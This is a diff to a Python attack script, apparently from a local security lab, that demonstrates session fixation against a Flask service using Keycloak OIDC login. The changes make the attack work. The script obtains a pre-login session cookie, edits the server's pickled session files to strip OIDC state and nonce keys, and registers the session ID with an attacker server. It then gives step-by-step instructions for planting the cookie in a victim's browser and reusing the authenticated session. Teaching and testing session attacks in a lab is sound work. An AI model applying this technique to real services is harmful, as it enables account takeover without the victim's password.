@@ -16,14 +16,24 @@ Utilização:
   python attacks/a09_session_fixation.py
 """
 
+import glob
 import http.cookiejar
+import os
+import pickle
 import sys
 import time
 import urllib.request
 import urllib.parse
 
-SP1_BASE    = "http://localhost:5001"
+SP1_BASE      = "http://localhost:5001"
 ATTACKER_BASE = "http://localhost:9999"
+
+# Locais possíveis do directório de sessões do Flask-Session
+FLASK_SESSION_DIRS = [
+    "./flask_session",
+    "./sp1/flask_session",
+    os.path.join(os.path.dirname(__file__), "..", "flask_session"),
+]
 
 LINE = "=" * 60
 
@@ -32,16 +42,29 @@ def print_step(n, title):
     print(f"  PASSO {n}: {title}")
     print(LINE)
 
+
 def get_fresh_session_id():
     """
-    Visita o SP1 sem fazer login para obter um session ID legítimo.
-    O SP1 cria uma sessão vazia e devolve o cookie sp1_session.
+    Visita /login do SP1 sem seguir o redirect para o Keycloak.
+    O Flask-Session cria a sessão e devolve Set-Cookie nesta resposta.
     """
     jar = http.cookiejar.CookieJar()
-    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
+
+    class NoRedirect(urllib.request.HTTPRedirectHandler):
+        def http_error_302(self, req, fp, code, msg, headers):
+            raise urllib.error.HTTPError(req.full_url, code, msg, headers, fp)
+        http_error_301 = http_error_302
+        http_error_303 = http_error_302
+
+    opener = urllib.request.build_opener(
+        urllib.request.HTTPCookieProcessor(jar),
+        NoRedirect()
+    )
 
     try:
-        opener.open(f"{SP1_BASE}/")
+        opener.open(f"{SP1_BASE}/login")
+    except urllib.error.HTTPError:
+        pass   # redirect esperado (para Keycloak) — o cookie já foi capturado
     except Exception as e:
         print(f"  [ERRO] Não foi possível contactar SP1: {e}")
         sys.exit(1)
@@ -53,31 +76,70 @@ def get_fresh_session_id():
     return None
 
 
+def clean_oidc_state():
+    """
+    Remove as chaves de estado OIDC da sessão mais recente no disco.
+    Isto evita MismatchingStateError quando a vítima inicia um novo
+    fluxo de login com o cookie fixado.
+
+    As chaves seguem o padrão: _state_keycloak_*
+    Formato do ficheiro: 4 bytes (expiração) + pickle do dict.
+    """
+    for session_dir in FLASK_SESSION_DIRS:
+        if not os.path.isdir(session_dir):
+            continue
+
+        files = sorted(
+            glob.glob(os.path.join(session_dir, "*")),
+            key=os.path.getmtime,
+            reverse=True
+        )
+        if not files:
+            continue
+
+        newest = files[0]
+        try:
+            with open(newest, "rb") as f:
+                header = f.read(4)        # 4 bytes de expiração (cachelib)
+                data = pickle.load(f)
+
+            oidc_keys = [k for k in data if "_state_" in k or "_nonce_" in k
+                         or k in ("state", "nonce")]
+            if oidc_keys:
+                for k in oidc_keys:
+                    del data[k]
+                with open(newest, "wb") as f:
+                    f.write(header)
+                    pickle.dump(data, f)
+                print(f"  ✅ Estado OIDC removido da sessão: {oidc_keys}")
+            else:
+                print(f"  ✅ Sessão limpa (sem estado OIDC)")
+            return True
+        except Exception as e:
+            print(f"  [AVISO] Não foi possível limpar ficheiro de sessão: {e}")
+            continue
+
+    print("  [AVISO] Directório flask_session não encontrado — continua sem limpeza.")
+    return False
+
+
 def check_authenticated_access(session_id):
     """
     Tenta aceder ao dashboard do SP1 usando o session ID fornecido.
     Devolve True se o acesso for autenticado (sem redirect para login).
     """
-    jar = http.cookiejar.CookieJar()
-    opener = urllib.request.build_opener(
-        urllib.request.HTTPCookieProcessor(jar),
-        urllib.request.HTTPRedirectHandler()
-    )
+    class NoRedirect(urllib.request.HTTPRedirectHandler):
+        def http_error_302(self, req, fp, code, msg, headers):
+            raise urllib.error.HTTPError(req.full_url, code, msg, headers, fp)
+        http_error_301 = http_error_302
+        http_error_303 = http_error_302
 
-    # Injectar o session ID manualmente
     req = urllib.request.Request(f"{SP1_BASE}/dashboard")
     req.add_header("Cookie", f"sp1_session={session_id}")
 
     try:
-        # Desactivar redirects para detectar se vai para /login
-        class NoRedirect(urllib.request.HTTPRedirectHandler):
-            def http_error_302(self, req, fp, code, msg, headers):
-                raise urllib.error.HTTPError(req.full_url, code, msg, headers, fp)
-            http_error_301 = http_error_302
-            http_error_303 = http_error_302
-
-        opener2 = urllib.request.build_opener(NoRedirect())
-        opener2.open(req)
+        opener = urllib.request.build_opener(NoRedirect())
+        opener.open(req)
         return True   # Sem redirect = autenticado
     except urllib.error.HTTPError as e:
         if e.code in (301, 302, 303):
@@ -97,7 +159,7 @@ def main():
     # PASSO 1: Atacante obtém um session ID do SP1
     # ------------------------------------------------------------------
     print_step(1, "Atacante obtém session ID do SP1")
-    print(f"\n  Visitando {SP1_BASE}/ sem fazer login...")
+    print(f"\n  Visitando {SP1_BASE}/login sem completar o fluxo OIDC...")
 
     sid = get_fresh_session_id()
     if not sid:
@@ -107,6 +169,10 @@ def main():
 
     print(f"\n  ✅ Session ID obtido:")
     print(f"     sp1_session = {sid}")
+
+    # Limpar o estado OIDC da sessão para evitar MismatchingStateError
+    print(f"\n  A limpar estado OIDC da sessão no servidor...")
+    clean_oidc_state()
 
     # ------------------------------------------------------------------
     # PASSO 2: Registar o session ID no attacker server
@@ -125,24 +191,27 @@ def main():
     # ------------------------------------------------------------------
     print_step(3, "Injectar o cookie na vítima (instrução manual)")
     print(f"""
-  O atacante envia à vítima um link ou injeta o cookie via XSS/MITM:
+  ⚠️  SEQUÊNCIA OBRIGATÓRIA (3 passos):
 
-  ┌─────────────────────────────────────────────────────┐
-  │  Cookie a injectar no browser da vítima:            │
-  │                                                     │
-  │  Nome:   sp1_session                                │
-  │  Valor:  {sid[:50]}...│
-  │  Domínio: localhost                                 │
-  │  Path:   /                                          │
-  └─────────────────────────────────────────────────────┘
+  ① Navega para http://localhost:5001
+    → o browser é redireccionado para o Keycloak (login do Keycloak)
+    → NÃO faças login — fica nessa página
 
-  No browser da vítima, abre a consola (F12) e executa:
+  ② Abre DevTools (F12) → Application → Cookies → http://localhost:5001
+    → Duplo-clique no VALOR de sp1_session → substitui por:
 
-    document.cookie = "sp1_session={sid}; path=/";
+      {sid}
 
-  Depois faz login em http://localhost:5001 com:
-    Username: bob
-    Password: bob123
+    Confirma que o valor foi alterado.
+
+  ③ Navega novamente para http://localhost:5001  ← PASSO CRÍTICO
+    → o SP1 recebe o cookie fixado e inicia um NOVO fluxo OIDC
+    → o browser vai para o Keycloak outra vez (nova página de login)
+    → AGORA faz login com:
+        Username: bob
+        Password: bob123
+
+  ➜ O OIDC callback será processado com o session ID do atacante!
 """)
 
     # ------------------------------------------------------------------
@@ -175,8 +244,10 @@ def main():
          -b "sp1_session={sid}" \\
          -L
 
-  Ou no browser, confirma que o cookie sp1_session={sid[:30]}...
-  ainda está definido e acede a http://localhost:5001/dashboard
+  Ou no browser do atacante, define o cookie e acede ao dashboard:
+
+    document.cookie = "sp1_session={sid}; path=/";
+    // depois navega para http://localhost:5001/dashboard
 
   ➜ O atacante tem acesso à sessão autenticada de bob SEM saber
     a sua password!
